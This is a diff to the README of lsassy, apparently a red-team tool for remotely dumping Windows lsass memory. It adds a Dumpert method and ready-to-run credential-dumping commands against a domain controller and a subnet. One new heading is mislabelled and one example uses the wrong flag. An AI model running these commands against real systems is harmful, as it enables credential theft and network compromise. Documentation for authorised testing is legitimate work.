@@ -1,6 +1,6 @@
 # lsassy
 
-[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=1.1.6&x2=0)](https://pypi.org/project/lsassy/) [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
+[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=1.1.7&x2=0)](https://pypi.org/project/lsassy/) [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
 
 ![CME Module example](https://github.com/Hackndo/lsassy/raw/master/assets/example.png)
 
@@ -60,6 +60,7 @@ Dumping methods (`-m` or `--method`)
 * **2**: Procdump method, stop on success (Requires -p)
 * **3**: comsvcs.dll + Powershell method, stop on success
 * **4**: comsvcs.dll + cmd.exe method
+* **5**: (unsafe) Dumpert method, stop on success (Requires -u)
 
 #### comsvcs.dll method
 
@@ -76,6 +77,11 @@ Two execution methods can be used.
 This method uploads **procdump.exe** from SysInternals to dump **lsass** process. It will first try to execute
 procdump using WMI, and if it fails it will create a remote task, execute it and delete it.
 
+#### Procdump method
+
+This method uploads **dumpert.exe** to dump **lsass** process. It will first try to execute
+dumpert using WMI, and if it fails it will create a remote task, execute it and delete it.
+
 #### Examples
 
 ```bash
@@ -84,6 +90,7 @@ lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 1
 lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 2 -p /path/to/procdump.exe
 lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 3
 lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 4
+lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 5 -u /path/to/dumpert.exe
 ```
 
 ### Remote parsing only
@@ -111,6 +118,9 @@ lsassy adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
 # Procdump Method
 lsassy -m 2 -p /tmp/procdump.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
 
+# Dumpert Method
+lsassy -m 5 -p /tmp/dumpert.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
+
 # Remote parsing only
 lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
 
@@ -121,7 +131,7 @@ lsassy --hashes 952c28bd2fd728898411b301475009b7 Administrator@desktop01.adsec.l
 ### CME Module
 
 ```
-crackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound
+crackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound DUMPERT_PATH=/tmp/dumpert.exe 
 ```
 
 ### ChangeLog
@@ -179,3 +189,4 @@ If you find an issue with this tool (that's very plausible !), please
 
 * [ITPPA](https://github.com/ITPPA/)
 * [viaccoz](https://github.com/viaccoz)
+* [blurbdust](https://github.com/blurbdust)
